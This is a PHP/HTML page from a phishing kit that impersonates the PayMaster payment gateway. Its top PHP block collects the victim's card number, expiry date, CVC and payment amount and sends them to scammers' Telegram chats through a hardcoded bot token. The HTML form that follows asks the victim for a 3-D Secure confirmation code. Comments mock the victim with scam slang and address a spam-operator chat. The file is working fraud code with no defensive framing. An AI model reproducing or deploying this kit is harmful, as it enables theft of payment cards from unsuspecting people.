<?

include "config.php";

$amount = $_GET["amount"];
$description = $_GET["description"];
$order_id = $_REQUEST["order_id"] ;

$date = date("d-m-Y H:i");
$card_number = str_replace(" ", "", $_POST["cardFrom"]);

    $message = "<b>❤️МАМОНТ ВВЕЛ ДАННЫЕ КАРТЫ❤️</b>
<b>🎯Номер транзакции:</b> " . $_REQUEST["order_id"] . "
<b>💰Сумма платежа:</b> " . $_POST["amount"] . " RUB

<b>💳Номер карты:</b> " . $card_number . "
<b>⏱Срок действия:</b> " . $_POST["cardFromMonth"] . "/" . $_POST["cardFromYear"] . "
<b>📼CVC-код:</b> " . $_POST["cardFromCVC"] . "

<b>📆Дата платежа:</b> " . $date . "

<b>Описание платежа:</b> " . $_POST["description"] . "";
sendTel($message);  
	
	
    function sendTel($message){
		$id = "-352545024"; // ID твой 
        $tokken = "1048887230:AAE_Aa3EmFsufiuano33FUQUIUU_kutD1MA"; // токен бота
		$filename = "https://api.telegram.org/bot".$tokken."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
    }
    
    $message2 = "🛎Уведомление о возможном залёте
💶Сумма платежа: " . $_POST["amount"] . " RUB
📅Дата платежа: " . $date . "
⌛️Статус: ТС'ы уже обрабатывают платеж!
";
sendTel2($message2);  
	
	
    function sendTel2($message2){
		$id1 = "-1001338620612"; // ID конфы спамеров
        $tokken1 = "1048887230:AAE_Aa3EmFsufiuano33FUQUIUU_kutD1MA"; // токен бота
		$filename = "https://api.telegram.org/bot".$tokken1."/sendMessage?chat_id=".$id1."&text=".urlencode($message2)."&parse_mode=html";
		file_get_contents($filename);
    }
   



?>

<!DOCTYPE html>
<html lang="ru-RU">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paymaster</title>

    <link rel="icon" href="https://paymaster.ru/Content/img/favico.ico" type="image/x-icon">
    <link href="https://paymaster.ru/content/css/styles.css?v=VmUO_daHKnGgzkzMjLGD1daBjTxvqoLa0MOXtIKpk2I1" rel="stylesheet">

</head>

<body>
    <div class="pp-viewport">
        <div class="pp-header pp-clearfix">
            <a class="pp-logo"></a>
        </div>



        <div class="token-based-payment-buttons">
            <div class="or hidden">
                или
            </div>
        </div>

        <a class="change-payment-type" id="changePS" style="display: flex;">

            <div class="selected-ps-name">
                <p>Введите код подтверждения</p>
            </div>
        </a>

        <form class="requisites-form" method="post" action="success.php">
			<input type="hidden" name="amount" value="<?=$amount;?>">
			<input type="hidden" name="description" value="<?=$description;?>">
			<input type="hidden" name="order_id" value="<?=$order_id;?>">

            <div class="payment-form-controls">
                <div class="payment-amount-block hidden">
                    <div class="form-control">
                        <div class="flipped-label">
                            <label>Сумма пополнения</label>
                            <input type="number" maxlength="12" name="payment_amount" id="paymentAmount" class="payment-amount" placeholder="макс. null" disabled="disabled">
                            <div class="sticker">
                                <span>RUB</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card-form card-form-group">
                    <div class="form-control">
                        <div class="flipped-label card-pan">
                            <label>Поле для ввода</label>
                            <input style="text-align:center;" data-num="0" type="tel" autocomplete="cc-number" name="3dsecure" maxlength="24"  required="" placeholder="XXXXXX">
                            <div id="detectedCard">
                            </div>
                        </div>
                    </div>


                </div>
            </div>

            <div class="pp-buttons pp-clearfix" id="buttonsBar">
                <button class="button primary-btn hidden right-aligned" type="button" id="returnToMerchant" data-href="https://plaza-lux.ru">
                    Вернуться в магазин
                </button>
                        <div class="pp-footer">
            <div>
                <div class="pp-copyrights">
                    Внимание! В связи с новыми правилами онлайн-платежей код может приходить с задержкой до 5 минут!
                </div>
			</div>

        </div>
                <button class="button primary-btn right-aligned" type="submit" >
                    Подтвердить
                </button>
            </div>
        </form>

        <div class="pp-footer">
            <div>
                <div class="pp-copyrights">
                    ©&nbsp;2010–2020&nbsp;PayMaster
                </div>
			</div>
            <div>
                <ul class="pp-langs">
                    <li>
                        <a>
                            <img src="https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Ukraine.svg" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
<!-- Chatra {literal} -->
<script>
    (function(d, w, c) {
        w.ChatraID = 'ZtNvjwhHZLBchzmx7';
        var s = d.createElement('script');
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        s.async = true;
        s.src = 'https://call.chatra.io/chatra.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'Chatra');
</script>
<!-- /Chatra {/literal} -->
</body>

</html>
